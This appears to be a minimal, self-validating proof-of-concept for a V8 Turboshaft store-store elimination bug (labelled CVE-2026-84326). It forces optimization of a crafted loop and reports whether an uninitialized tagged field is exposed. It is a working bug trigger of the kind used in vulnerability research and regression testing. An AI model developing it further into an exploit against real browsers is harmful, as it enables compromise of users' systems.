'use strict';

// Minimal self-validating PoC for CVE-2026-84326 / issue 547936520.
//
// Expected JavaScript semantics:
//   holder.prev refers to the penultimate object, whose target is 0x42.
//
// Vulnerable optimized semantics:
//   Turboshaft Store-Store Elimination drops the loop's target = 0x42
//   store, so holder.prev.target exposes an uninitialized tagged field.

const EXPECTED = 0x42;
const holder = {pad: null, y: null, prev: null};

function candidate() {
  let object;
  let sink = 0;
  let i = 0;

  while (true) {
    holder.prev = holder.y;
    object = {target: null};
    holder.y = object;

    if (i < 6) {
      object.target = EXPECTED;

      // Keep the loop above Turboshaft's partial-unrolling size threshold.
      // Returning sink below prevents dead-code elimination from removing it.
      sink = sink ^ i ^ (sink << 1) ^ (sink << 2) ^ (sink << 3) ^
             (sink << 4) ^ (sink << 5) ^ (sink << 6) ^ (sink << 7) ^
             (sink << 8) ^ (sink << 9) ^ (sink << 10) ^ (sink << 11) ^
             (sink << 12) ^ (sink << 13) ^ (sink << 14) ^ (sink << 15);
      i = (i + 1) | 0;
    } else {
      break;
    }
  }

  // This store targets the final object, not holder.prev's object.
  object.target = 0x43;
  return [object, sink];
}

function hex(value) {
  return typeof value === 'number'
      ? `0x${value.toString(16)}`
      : `<${typeof value}>`;
}

%PrepareFunctionForOptimization(candidate);

// Establish the correct, unoptimized result and collect feedback.
candidate();
const baseline = holder.prev.target;
candidate();

if (baseline !== EXPECTED) {
  print(`[HARNESS ERROR] baseline=${hex(baseline)}, expected=0x42`);
  quit(2);
}

// Force the compilation path containing the vulnerable Turboshaft reducer.
%OptimizeFunctionOnNextCall(candidate);
candidate();
const optimized = holder.prev.target;

print(`baseline  = ${hex(baseline)}`);
print(`optimized = ${hex(optimized)}`);

if (optimized === EXPECTED) {
  print('[NOT REPRODUCED] the required target = 0x42 store was preserved');
  quit(1);
}

print('[VULNERABLE] optimized execution dropped the required store');
print('[VULNERABLE] holder.prev.target exposed a stale tagged value');
quit(0);
